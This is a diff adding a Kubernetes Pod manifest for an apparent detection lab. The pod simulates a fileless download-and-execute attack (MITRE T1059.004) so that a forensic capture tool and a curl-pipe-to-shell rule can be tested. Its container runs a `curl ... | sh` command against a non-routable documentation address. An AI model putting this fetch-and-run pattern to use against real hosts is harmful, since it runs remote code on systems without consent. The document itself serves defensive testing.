@@ -1,0 +1,48 @@
+# Scenario 1: fileless download-and-execute, then immediate self-destruct.
+#
+# Technique: T1059.004. Rule: curl_pipe_sh.
+#
+# This is the hardest case for the tool and the reason it exists: the pod lives
+# for roughly two seconds, nothing is ever written to disk, and the payload
+# exists only as bytes in the shell's memory. A reactive forensic process
+# arrives to an empty node.
+#
+# SIMULATION: the stage-2 URL is in the IETF documentation range (RFC 5737) and
+# resolves to nothing. curl fails; the execve that carries the URL is what the
+# rule matches, and the URL is still resident in the shell's heap when the
+# capture reaches it.
+apiVersion: v1
+kind: Pod
+metadata:
+  name: fileless-payload
+  namespace: victim
+  labels:
+    app.kubernetes.io/part-of: flight-recorder-lab
+    scenario: fileless
+  annotations:
+    flight-recorder.io/scenario: "T1059.004 fileless download-and-execute"
+spec:
+  restartPolicy: Never
+  terminationGracePeriodSeconds: 0
+  containers:
+    - name: payload
+      image: curlimages/curl:8.11.1
+      command: ["/bin/sh", "-c"]
+      args:
+        - |
+          # The marker string stays in the shell's memory for the pod's whole
+          # (short) life, so a successful capture can be proven by finding it.
+          STAGE2_URL="http://198.51.100.23/stage2.sh"
+          C2_MARKER="FLIGHT_RECORDER_SCENARIO_FILELESS_MARKER"
+          echo "simulating: curl -s $STAGE2_URL | sh"
+          curl -s --max-time 2 "$STAGE2_URL" | sh || true
+          sleep 2
+      securityContext:
+        allowPrivilegeEscalation: false
+        runAsNonRoot: true
+        runAsUser: 1000
+        capabilities:
+          drop: ["ALL"]
+      resources:
+        requests: { cpu: 10m, memory: 32Mi }
+        limits: { cpu: 200m, memory: 128Mi }
